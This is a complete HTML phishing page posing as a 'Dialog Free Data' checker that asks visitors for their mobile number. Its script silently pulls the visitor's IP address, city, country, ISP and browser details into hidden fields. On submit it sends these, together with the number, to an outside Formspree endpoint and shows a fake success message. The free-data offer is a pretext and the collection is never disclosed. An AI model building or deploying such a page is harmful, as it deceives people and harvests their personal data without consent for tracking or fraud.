<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dialog Free Data</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('https://i.ibb.co/h1BX74P8/1914.jpg') no-repeat center center;
      background-size: cover;
      font-family: Arial, sans-serif;
    }

    .overlay {
      background: rgba(0, 0, 0, 0.65);
      width: 100%;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      box-sizing: border-box;
      color: white;
      text-align: center;
    }

    input, button {
      padding: 12px;
      font-size: 16px;
      border-radius: 10px;
      border: none;
      margin-top: 15px;
      width: 80%;
      max-width: 350px;
    }

    input {
      background: #fff;
      color: #000;
    }

    button {
      background-color: #00a8ff;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }

    #status {
      margin-top: 10px;
      color: #0f0;
      display: none;
    }
  </style>
</head>
<body>
  <div class="overlay">
    <form id="trackForm">
      <input type="text" name="Dialog Number" placeholder="Enter your Dialog Number : - 077xxxxxxx" required>
      <input type="hidden" name="IP Address" id="ip">
      <input type="hidden" name="Location" id="location">
      <input type="hidden" name="Device Info" id="device">
      <button type="submit">Check Free Data</button>
    </form>
    <p id="status">Submitting... Please wait</p>
  </div>

  <script>
    async function fetchInfo() {
      try {
        const res = await fetch("https://ipwho.is/");
        const data = await res.json();
        if (data.success) {
          document.getElementById("ip").value = data.ip;
          document.getElementById("location").value =
            `Country: ${data.country}, City: ${data.city}, ISP: ${data.connection.isp}`;
        }
        document.getElementById("device").value = navigator.userAgent;
      } catch (e) {
        console.log("Error fetching IP info");
      }
    }

    fetchInfo();

    document.getElementById("trackForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      document.getElementById("status").style.display = "block";
      const formData = new FormData(this);

      await fetch("https://formspree.io/f/xvgkdndd", {
        method: "POST",
        body: formData,
        headers: { Accept: "application/json" }
      });

      document.getElementById("status").innerText = "Submitted Successfully!";
    });
  </script>
</body>
</html>
